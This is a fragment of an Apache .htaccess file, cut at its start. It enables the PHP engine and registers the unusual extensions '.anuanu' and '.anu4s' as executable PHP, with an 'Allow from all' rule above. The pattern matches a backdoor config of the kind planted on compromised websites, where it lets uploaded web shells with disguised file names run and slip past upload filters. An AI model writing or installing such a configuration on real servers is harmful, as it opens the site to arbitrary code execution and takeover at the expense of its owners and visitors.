    Allow from all
</FilesMatch>

php_flag engine on

AddType application/x-httpd-php .anuanu
AddType application/x-httpd-php .anu4s

<FilesMatch "\.(anuanu|anu4s)$">
    php_flag engine on
</FilesMatch>
